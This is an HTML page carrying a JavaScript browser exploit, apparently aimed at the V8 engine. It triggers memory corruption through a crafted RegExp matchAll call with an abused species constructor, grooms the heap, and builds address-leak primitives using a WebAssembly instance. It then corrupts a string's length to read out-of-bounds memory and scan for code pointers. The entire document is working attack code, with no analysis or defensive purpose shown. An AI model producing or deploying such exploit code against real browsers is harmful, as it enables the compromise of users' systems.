<!doctype html><html><head><meta charset="utf-8"><title>P48</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
const marker={mmm:1};
const marker2={zzz:2};
const objB=new Array(0x8000);
for(var i=0;i<objB.length;i++)objB[i]=marker;
const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
objB[4]=wasmI;
// PRE-ALLOCATE ES before trigger — will be promoted to old space
const dec=new TextDecoder("windows-1252");
const eb=new Uint8Array(0x40);eb.fill(0x41);
const es=dec.decode(eb);
const re=/(?:)/;
const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
const c0=w2f(DMAP,EMPTY);
const sk=[];
log("UA: "+navigator.userAgent);
// PRE-PROMOTE all objects including ES
trash(230);trash(230);
objB[4]=wasmI;objB[5]=marker; // re-touch
RegExp.prototype[Symbol.matchAll].call(fk,"").next();
log("TRIG: "+re.lastIndex);
trash(230);trash(230);
for(let r=0;r<3;r++){const c1=w2f(0x1080011,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
try{
const m=re.lastIndex;
log("T: "+typeof m+" A="+Array.isArray(m));
if(Array.isArray(m)){
  log("L: "+m.length);
  // Scan for LIVE objB
  const cands=[];
  for(let k=0x8000;k<0x10010;k++){
    try{
      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){
        if(f2i(m[k+1])===v){
          const v3=f2i(m[k+2]);const w=v3&0xffffffffn;
          if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}
        }
      }
    }catch(e){break;}
    if(cands.length>=6)break;
  }
  let liveK=-1;
  for(const k of cands){
    const b=f2i(m[k+2]);
    objB[4]=marker2;
    const a=f2i(m[k+2]);
    objB[4]=marker;
    if(a!==b){liveK=k;break;}
  }
  if(liveK>=0){
    log("LIVE@"+liveK.toString(16));
    objB[4]=wasmI;
    const wasmAddr=f2i(m[liveK+2])&0xffffffffn;
    objB[4]=marker;
    log("WASM:"+wasmAddr.toString(16));
    // ES addrof
    objB[4]=es;
    const esAddr=f2i(m[liveK+2])&0xffffffffn;
    objB[4]=marker;
    log("ES:"+esAddr.toString(16));
    // ES length corruption
    const tq=(esAddr-1n)+8n;
    const off=tq-0x1080018n;
    log("OFF:"+off.toString(16));
    if(off>0n&&off<0x1000000n){
      const idx=Number(off>>3n);
      if((off&7n)===0n){
        const v=f2i(m[idx]);
        m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
      }else{
        const idx2=Number((off-4n)>>3n);
        const a=f2i(m[idx2]);
        m[idx2]=i2f((0x01200000n<<32n)|(a&0xffffffffn));
      }
      log("NL:"+es.length.toString(16));
      if(es.length>=0x100000){
        // Scan for code pointers
        const P=[];
        for(let off2=0x10;off2<0x7F00;off2+=0x10){
          try{
            let qw=0n;
            for(let b=0;b<8;b++)qw|=BigInt(es.charCodeAt(off2+b))<<BigInt(b*8);
            const top=Number(qw>>56n);
            if(top>=0x55&&top<=0x56){P.push(off2.toString(16)+":"+qw.toString(16));if(P.length>=4)break;}
            if(top===0x7f){P.push(off2.toString(16)+":7f.."+((qw>>40n)&0xffffn).toString(16));if(P.length>=4)break;}
          }catch(e){break;}
        }
        if(P.length)log("CP:"+P.join(","));
        else{
          // Show non-zero data
          const D=[];
          for(let off2=0x40;off2<0x400;off2+=0x20){
            try{
              let qw=0n;
              for(let b=0;b<8;b++)qw|=BigInt(es.charCodeAt(off2+b))<<BigInt(b*8);
              if(qw!==0n){D.push(off2.toString(16)+":"+qw.toString(16).slice(-12));if(D.length>=6)break;}
            }catch(e){}
          }
          log("D:"+(D.length?D.join(","):"ZERO"));
        }
      }
    }else{log("OFF_BAD:"+off.toString(16));}
  }else{log("STALE");}
  log("W: "+wasmI.exports.f());
}else{log("NA");}
}catch(e){log("E: "+e.message);}
log("=== DONE ===");
</script></body></html>
